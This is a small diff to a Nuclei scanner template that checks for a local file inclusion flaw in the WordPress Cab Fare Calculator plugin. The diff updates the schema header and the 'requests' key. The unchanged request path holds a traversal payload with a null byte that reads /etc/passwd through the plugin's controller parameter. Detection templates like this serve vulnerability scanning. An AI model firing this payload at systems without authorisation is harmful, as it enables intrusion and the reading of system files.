@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: cab-fare-calculator-lfi
 
 info:
@@ -9,7 +10,7 @@ info:
     - https://wordpress.org/plugins/cab-fare-calculator
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1'
